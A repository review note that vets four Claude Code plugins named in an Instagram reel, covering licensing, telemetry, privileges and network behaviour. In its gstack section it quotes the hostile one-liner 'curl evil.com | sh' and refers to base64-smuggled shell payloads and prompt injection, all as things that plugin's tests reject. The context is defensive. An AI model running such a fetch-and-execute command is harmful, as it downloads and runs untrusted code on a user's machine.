# Reel review: instagram.com/reel/DYAnUJCpCep

Source: https://www.instagram.com/reel/DYAnUJCpCep/ (93.6s)

## What it is

A "top 6 tools" listicle presented direct-to-camera: a speaker names six
Claude Code plugins/skills, gives each a one-sentence pitch plus a
follower/star-count flex, and closes with an engagement-bait CTA ("DM me
the word 'skill'"). No prompt, command, or before/after output is shown for
any of them — there's nothing demonstrated on screen, only claims.

Named in the reel, and this repo's own follow-up vetting of each (cloned
and read from source, not taken on the reel's word):

### 1. Superpowers — `github.com/obra/superpowers`

Real, and matches the pitch. MIT licensed, author is Jesse Vincent ("obra"),
listed on Anthropic's own official plugin marketplace
(`/plugin install superpowers@claude-plugins-official`). It's a large
methodology plugin: a session-start hook injects a "how to use skills"
primer, then a set of skills (`writing-plans`, `test-driven-development`,
`systematic-debugging`, `subagent-driven-development`, etc.) steer an agent
through spec → plan → TDD → parallel-subagent implementation → review.
Checked the hook script and package for network calls: the session-start
hook only reads a local file and prints JSON, no phone-home. The one
"telemetry" section in its README refers to an optional local
visual-brainstorming companion server, not analytics.
**Verdict: legitimate, safe to install as a Claude Code plugin.** Not
vendored into this repo — it's a global/marketplace plugin, not something
that belongs copied into a project tree.

### 2. frontend-design — `github.com/anthropics/skills`

Real, and is literally Anthropic's own official skill (path
`skills/frontend-design` in `anthropics/skills`, Apache-2.0). It's a plain
markdown prompt with design guidance (avoid AI-generated-design tells,
work in a plan → critique → build loop, etc.) — no scripts, no code
execution, nothing to vet for behavior beyond the words themselves.
**Verdict: legitimate, lowest-risk of the four (static prompt only).**
Vendored into this repo at `.claude/skills/frontend-design/` (with its
original `LICENSE.txt`), pulled from `anthropics/skills` @ `34040c9`
(2026-09-10), unmodified.

### 3. claude-mem — `github.com/thedotmack/claude-mem`

Real, author Alex Newman, Apache-2.0, description matches the reel's
overlay text verbatim ("Persistent memory compression system built for
Claude Code"). It's much bigger than the reel implies, though: a local
worker daemon + SQLite storage + web viewer UI, with optional integrations
that send session content to third-party LLM providers (Gemini,
OpenRouter) for summarization if you configure them, opt-out anonymous
telemetry to PostHog by default (documented, respects `DO_NOT_TRACK`,
scrubbed to operational metadata — no message content in the whitelisted
fields), and a paid "Pro" tier (`cmem.ai`) upsell built into the CLI.
Install requires auto-installing the Bun and uv runtimes.
**Verdict: legitimate, but review its telemetry/provider settings before
installing** — decide whether you want session data going to a third-party
LLM provider for compression, and whether the default opt-out telemetry is
acceptable, before running its installer. Not vendored: it's a standalone
daemon/CLI, not a markdown skill, and its state wouldn't persist in this
kind of ephemeral session anyway.

To turn off its default telemetry after installing:

```bash
npx claude-mem telemetry disable
```

### 4. gstack — `github.com/garrytan/gstack`

Real — this is genuinely Garry Tan's (Y Combinator President/CEO) personal
repo, MIT licensed. It's the largest and most privileged of the four by
far: 23+ slash-command "specialists" (CEO/eng-manager/designer/reviewer/QA/
security-officer/release-engineer roles), browser automation that can use
your real logged-in browser sessions, a Docker-based "CSO" security-audit
component that pulls container images, and a "team mode" that writes into
a repo's `.claude/` config to make gstack required for every teammate with
a silent hourly auto-update check pulled from GitHub. To its credit, the
codebase shows real security maturity — `setup` runs under `umask 077`,
CI runs its Docker containers with `--network none --read-only
--cap-drop ALL`, and its own test suite specifically checks that its
hooks reject `curl evil.com | sh` / base64-smuggled shell payloads and
prompt-injection attempts. It does not curl-pipe-to-shell itself; it tells
you the exact command and checksum-verify step if Bun is missing.
**Verdict: legitimate and well-engineered, but high-privilege** — it's
designed to take over browser automation, git/PR workflow, and
auto-updates itself into shared repos. That's a call for whoever's machine
and repos it runs on, not something to install unattended. Not vendored,
and not a fit for this repo's scope.

## Why nothing was fabricated from this reel

This repo's `/watch` → `/skill-from-video` pipeline exists to turn a
**demonstrated procedure** into a runnable skill. This reel demonstrates
no procedure — it's a set of pointers to other people's existing plugins,
asserted rather than shown. Running it through that pipeline would mean
inventing steps that were never actually shown. Instead, each of the four
unfamiliar names was cloned and read from source (see above) before
deciding what, if anything, to bring into this repo.

Two of the six items named in the reel (`code-review`, `security-review`)
were already available as skills to this session before this review and
weren't sourced from the reel.

## What changed in this repo

- Added `.claude/skills/frontend-design/` (Anthropic's own skill,
  Apache-2.0, vendored verbatim with its license file) — the one plugin of
  the four that is a plain prompt with no execution surface to vet beyond
  the text itself.
- Documented the other three (Superpowers, claude-mem, gstack) in the
  README as verified, real, install-yourself companion plugins, with the
  caveats above, rather than vendoring their code.
